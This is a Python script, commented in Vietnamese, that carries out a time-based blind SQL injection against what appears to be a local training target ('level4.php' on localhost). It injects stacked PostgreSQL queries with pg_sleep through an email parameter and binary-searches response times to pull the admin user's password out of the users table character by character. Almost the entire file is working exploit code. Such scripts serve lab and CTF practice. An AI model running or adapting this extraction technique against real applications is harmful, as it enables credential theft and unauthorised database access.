import requests
import time
from urllib.parse import quote
import string

# --- CẤU HÌNH ---
URL_TARGET = 'http://localhost:20504/level4.php' 
TARGET_USER = 'admin' 
SLEEP_TIME = 2 
THRESHOLD = 1.8 

# Session giúp giữ kết nối
session = requests.Session()

# Bộ ký tự (bỏ các ký tự điều khiển gây lỗi)
CHARSET = sorted([ord(c) for c in string.printable if c not in ['\n', '\r', '\t']])
PASSWORD = []

print(f"[*] Target: {URL_TARGET}")
print(f"[*] Bắt đầu dò password cho user: {TARGET_USER}")

def make_request(payload_sql):
    """
    Hàm gửi payload và trả về thời gian phản hồi
    """
    # [FIX] Khai báo global ngay đầu hàm
    global session 

    # Payload: Chỉ chạy pg_sleep, không SELECT từ bảng users ở ngoài cùng
    full_payload = f"SELECT (CASE WHEN ({payload_sql}) THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END)--"
    
    encoded_payload = quote(full_payload)
    final_url = f"{URL_TARGET}?email=test'%3b{encoded_payload}"
    
    try:
        start = time.perf_counter()
        # Timeout set là 5s. Nếu quá 5s mà chưa xong -> Đang ngủ -> TRUE
        session.get(final_url, timeout=5) 
        end = time.perf_counter()
        
        # Nghỉ nhẹ 1 xíu để server không bị nghẽn
        time.sleep(0.1) 
        
        return end - start

    except requests.exceptions.ReadTimeout:
        # Nếu Timeout -> Server đang ngủ -> TRUE
        print(" [Timeout -> TRUE]", end='')
        
        # Reset session để tránh lỗi kết nối cho lần sau
        session = requests.Session()
        return 10.0 
        
    except Exception as e:
        print(f"\n[!] Lỗi kết nối: {e}")
        session = requests.Session()
        return 0

# --- LOGIC DÒ TÌM ---
# Nếu muốn dò lại từ đầu thì để PASSWORD = [] và start_pos = 1
PASSWORD = []
start_pos = 1

for position in range(start_pos, 50): 
    low = 0
    high = len(CHARSET) - 1
    found = False
    
    print(f"[*] Đang dò ký tự thứ {position}...", end='\r')

    while low <= high:
        mid = (low + high) // 2
        char_mid = CHARSET[mid]

        # 1. So sánh LỚN HƠN (>)
        condition_gt = f"ASCII(SUBSTR((SELECT password FROM users WHERE username='{TARGET_USER}' LIMIT 1), {position}, 1)) > {char_mid}"
        
        time_taken = make_request(condition_gt)

        if time_taken >= THRESHOLD:
            low = mid + 1
        else:
            # 2. Kiểm tra BẰNG (=)
            condition_eq = f"ASCII(SUBSTR((SELECT password FROM users WHERE username='{TARGET_USER}' LIMIT 1), {position}, 1)) = {char_mid}"
            
            time_taken_eq = make_request(condition_eq)
            
            if time_taken_eq >= THRESHOLD:
                char = chr(char_mid)
                PASSWORD.append(char)
                print(f"[+] Ký tự {position}: {char} | Pass: {''.join(PASSWORD)}           ")
                found = True
                break
            else:
                high = mid - 1

    if not found:
        print("\n[-] Kết thúc chuỗi (hoặc không tìm thấy).")
        break

print("\n" + "="*40)
print(f" FINAL PASSWORD: {''.join(PASSWORD)}")

print("="*40)
